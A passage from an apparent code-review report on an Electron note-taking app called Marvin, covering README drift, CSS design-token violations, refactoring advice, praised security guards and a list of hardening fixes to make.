- Lines 54–60: "Project layout" references `ClaudeTerminal.tsx`,
  `ContextMenu.tsx`, `SidebarMenu.tsx` — none of these exist in
  `src/components/`. The real names are `AgentTerminal.tsx`, native menus
  via `app:show-context-menu`, no `SidebarMenu` (replaced by
  `FileTreeToolbar`).
- Lines 92–97: "What's not (yet) here" lists wikilinks `[[name]]` and
  "Full-text search" — both exist (`src/lib/wikilinks.ts` and
  `electron/search-content.ts`).
- The whole agent/snapshot/browser-tab/HTML-preview/CSV-editor surface is
  unmentioned.

For a project where Claude is reading the README to understand intent, the
drift is actively harmful. A regenerate from the current code state is
warranted.

### 🟡 Design-token violations in `src/App.css`

Per `.claude/rules/design-tokens.md`: "No new hex, px, or rem literals in
component CSS when a token exists. … All color values must use color
tokens, even white, black, or grays. Hardcoded `#fff` or `rgba(0,0,0,…)`
is a flag for review."

Counts (search-based, not exhaustive):

- 84 `#hex` occurrences in `src/App.css`. Most are inside token
  definitions (`:root` + `[data-theme='dark']`), which is fine, but I
  spot-checked ~10 that are not:
  - `src/App.css:949` `background: #4a1f1a33;`
  - `src/App.css:1221` `background-color: #1e1e1e;` (image viewer
    checker — should use `--surface-3` and a derived darker token)
  - `src/App.css:1567` `background: #1e1e1e;`
  - `src/App.css:1995, :2740` `color: #1a1a1a;` (find match active)
  - `src/App.css:2050, :2321` `background: #b08940;`
  - `src/App.css:2055, :2326` `background: #5c5c5c;`
  - `src/App.css:2059, :2330` `background: #c0392b;`
  - `src/App.css:4153` `background: #3a2e15;`
  - `src/App.css:4160` `background: #1f2c3a;`
  - `src/App.css:5246` `color: #fff;`
- 30+ raw `rgba()` literals outside tokens. Several are box-shadow values
  that should use `--shadow-md` / `--shadow-lg`:
  - `src/App.css:2394` `box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5)`
  - `src/App.css:3464` `box-shadow: 0 12px 96px rgba(0, 0, 0, 0.40)`
  - `src/App.css:3856, :4240` similar
- 231 raw `padding/margin/gap/width/height` in px. Many of these are
  intentional (icons, fixed-height spinners), but the majority of
  `padding: 6px 10px` etc. should be `var(--space-2) var(--space-3)`.
  E.g. `src/App.css:327, :616, :682, :1198, :1271, :1348, :1531, :1549,
  :1668`.

Fix: spike a follow-up pass — most of these are mechanical. The token
system loses a lot of its value if components opt out.

### 🟡 `humanizeError` regex catalog scattered

`src/App.tsx:229`–`:251` parses string `MARVIN_*` codes. Same codes
appear in `electron/main.ts` constants and `electron/snapshot.ts`. Move
to a shared `src/shared/errors.ts` (you already have a `shared/` dir for
`agent-protocol.js`) so renaming a code doesn't break the
matcher silently.

### 🟡 Path joining uses `/` literal everywhere

`src/App.tsx:565, :1248, :1293, :1800, :1810` and similar in the
components. The README disclaims Windows support, but the
`humanizeError` does `enoent[1].split('/')` which would break first.
Centralize in a `src/lib/paths.ts` with `dirOf`, `joinVault`, `relTo`,
`basename` — both for clarity and to make a future Linux/Windows port a
day rather than a week.

### 🟡 React 19's `useEffect` returning `off` directly is brittle

`src/App.tsx:443, :452, :515, :964`: the pattern `return off` returns the
function returned from `window.marvin.X.onChanged(...)`. If `off` is ever
`undefined` (e.g. main side returns nothing on init failure), React
silently swallows it. Wrap defensively:

```ts
return () => { try { off() } catch { /* noop */ } }
```

### 🟢 `Editor.tsx` is 820 lines and growing

`src/components/Editor.tsx`: single component handling raw edit, live
preview, frontmatter, CSV, HTML preview, drop, mention, find/replace,
context menu, autosave. The CodeMirror lifecycle, the autosave debounce,
the find-bar state, and the mention picker each deserve their own hook
file under `src/lib/editor/`.

### 🟢 Type duplication for `FileNode`, `Tab`, `MenuItemSpec`

`FileNode` is defined in `electron/main.ts:462`, `electron/preload.ts:9`,
`src/types.ts:9`. `Tab` is defined inline in both `src/App.tsx:122` and
`src/components/TabBar.tsx:39`. `MenuItemSpec` is in
`electron/main.ts:971`, `electron/preload.ts:25`, `src/types.ts:67`.
Pick one source (`src/shared/`) and import everywhere.

### 🟢 `App.tsx` is 1834 lines

The orchestration component has slowly absorbed every concern: shortcut
keys, dialog state, drag/drop, tab management, browser tabs, snapshot
toasts, external-edit conflicts, palette, settings. Extract:
`useTabsReducer`, `useFileSync`, `useSnapshotToasts`,
`useGlobalShortcuts`. The current shape makes onboarding hostile.

---

## What's good

Genuine credit where it's due:

- **Vault boundary checks are taken seriously and consistent.**
  `electron/vault-boundary.ts` resolves symlinks at every step (parent
  dir + target), handles dangling symlinks correctly, returns the
  realpath-resolved I/O path so callers don't TOCTOU, and is reused by
  every IPC handler that touches user paths. The PRD codes
  (C1/C2/C3/H2/H4/M9) in the comments make the design intentional.
- **PTY spawn surface is hardened correctly.** `pty-spawn-guard.ts` does
  realpath on the shell, allowlists known generic shells *and* a separate
  set of agent binaries with different arg policies (`MARVIN_SHELL_
  ARGS_FORBIDDEN` for generic shells but not agent CLIs). The
  agent-detect side is a hardcoded list, not a free-form name lookup.
- **`agent-detect-guard.ts` + `pty-spawn-guard.ts` + `vault-allowlist.ts`
  are each <50 LOC and trivially unit-testable.** That's the right
  shape — small modules with one public function that throws on
  violation.
- **`getShellEnv` `detached: true` workaround** (`electron/main.ts:48`–`:62`)
  is a genuinely subtle Electron/job-control bug; the comment explaining
  *why* is exactly what future maintainers need.
- **`teardownChildren` + `before-quit` pendingTeardowns guards orphans
  across the macOS Cmd+Q ↔ window-close gap** (`electron/main.ts:383`–
  `:419`). This is the kind of teardown most Electron apps get wrong.
- **`marvin://` protocol response carries a defense-in-depth CSP**
  (`electron/main.ts:348`) — explicitly blocking script/object even when
  SVG is loaded via `<img>`. Layered.
- **The snapshot system is well thought through:** turn IDs are
  timestamp-prefixed for natural sort, manifests are validated on read
  (`validateManifest`), GC has both count and size caps, expired turns
  go through `shell.trashItem` (recoverable), and the GC defense
  double-checks the path before trashing. `electron/snapshot.ts`
  generally.
- **`FileTreeNode` `areEqual` custom memoization** with derived booleans
  (`src/components/FileTree.tsx:355`–:395) is the correct fix for the
  O(n) re-render trap on every hover/select. Comment cites the issue
  number — that's institutional memory.
- **Idempotent `browser:create`** (`electron/main.ts:1159`–`:1170`)
  survives HMR remounts without leaking WebContentsView instances.
- **`searchContent`** correctly translates rg byte offsets to JS char
  offsets for UTF-8 safety (`electron/search-content.ts:30`), and
  `assertCwdInsideVaultAsync` is run on every result *after* rg returns —
  defense-in-depth.

---

## Quick wins (≤30min each)

1. Add `<meta http-equiv="Content-Security-Policy" content="…">` to
   `index.html`. Even a permissive starting CSP is better than none.
2. Gate `setWindowOpenHandler` URL by scheme (`/^(https?|mailto):/i`) at
   `electron/main.ts:256` and `:1196`.
3. Add `will-navigate` handler on the main window
   (`electron/main.ts:226`).
4. Whitelist settable keys in `settings:set`
   (`electron/main.ts:430`) — explicitly reject `vaultPath`.
5. Add `assertInVault(filePath)` at the top of `file:exportPdf`
   (`electron/main.ts:905`).
6. Wrap the bootstrap IIFE in `try/finally` and always
   `setBootstrapped(true)` (`src/App.tsx:392`).
7. Symmetrize `closeTab` / `closeTabsUnder`: clear both
   `lastDiskContentRef` and `bufferContentRef` for paths no tab still
   owns (`src/App.tsx:785`, `:1223`).
8. On Editor unmount, fire one final `onSaveRef.current(latestValue.current)`
   before clearing the timer (`src/components/Editor.tsx:428`).
9. Add `role="alert"` and `aria-live="assertive"` to the error toast
   (`src/App.tsx:1759`).
10. Single shared `TURN_ID_RE` between `main.ts` and `snapshot.ts`.
11. Add `sandbox: true` to the main BrowserWindow webPreferences
    (`electron/main.ts:242`).
12. Cap `pty:write` data length per call to e.g. 1 MiB
    (`electron/main.ts:1125`).
13. Update `README.md` Project layout section to match real component
    names; bump status to 0.10.0; remove "wikilinks" and "full-text
    search" from the "not yet" list.
14. Replace `humanizeError`'s use of `\n` rgb literals etc.; cap toast
    text at ~280 chars (`src/App.tsx:229`).

---

## Bigger refactors (tracking-issue worthy)

Each of these should land as a separate issue per
`.claude/rules/git-workflow.md` — issues first, then sub-issues if they
size at M or L.

### Issue: code-fence-aware markdown link rewriter

Replace the regex in `electron/main.ts:718`–`:769` with a `marked` lexer
walk. Cover reference-style links, fenced/inline code skip, raw HTML
`href`/`src`, and proper idempotency. Test fixtures should include the
README of the repo (which has every link form). Size: M.

### Issue: enable `"strict": true` in tsconfigs

Start with `electron/`, then `src/lib/`, then components. Document the
migration in `docs/` with the diff count per directory. Size: M.

### Issue: a11y pass on FileTree (roving-tabindex tree)

Implement WAI-ARIA Authoring Practices for the tree pattern: arrow keys,
home/end, type-ahead, focus management. Make the row a focusable element
(swap `<button>` for `<div role="treeitem" tabIndex={isFocused?0:-1}>`).
Size: M.

### Issue: introduce `aiActive` flag separate from `lastPtyWriteAt`

`electron/main.ts:96` and consumers. Make the snapshot pre-write hook
actually run during native-chat agent edits. Size: S–M.

### Issue: tighten Electron security defaults

CSP, sandbox, will-navigate, openExternal scheme guards. Coordinate with
e2e test changes since some of these may break the dev workflow first
time around. Size: M.

### Issue: extract orchestration out of `App.tsx`

`src/App.tsx` is 1834 lines, hosts ~30 callbacks, and is the single
React component responsible for everything. Pull out
`useTabsReducer`, `useGlobalShortcuts`, `useFileSync`,
`useExternalChangeBanner`, `useSnapshotToasts`. Size: L → milestone
with sub-issues per hook.

### Issue: replace IPC handler types with a runtime-validated schema

Wrap `ipcMain.handle` in a typed helper that takes a zod-style schema
for each argument. Today, only snapshots and agent IPC validate args.
A consistent helper would catch hand-rolled bugs (the unscoped
`settings:set`, the unbounded `pty:write`) by construction. Size: M.

### Issue: design-token compliance audit + lint

Add a simple stylelint rule that flags raw `#hex` and raw `Npx` outside
`:root` / `[data-theme=…]` blocks, with a documented allowlist. Migrate
existing offenders in `src/App.css` to tokens. Size: M.

---

## End notes

Marvin's security posture is unusually rigorous in some places (vault
boundary, pty allowlist, agent guard) and unusually lax in adjacent
places (CSP, settings IPC, file:exportPdf, window open handler). The
fix isn't conceptually hard — the patterns to copy already exist
inside the codebase. Bring the laggers up to the standard set by
`vault-boundary.ts` and the system becomes consistent.

The renderer side's main risk is the Editor/Tab state machine quietly
losing user data on close — small fix, big trust win.

The README drift is the single fastest way to mislead Claude (and human
contributors) about what the system does. Worth fixing this week.
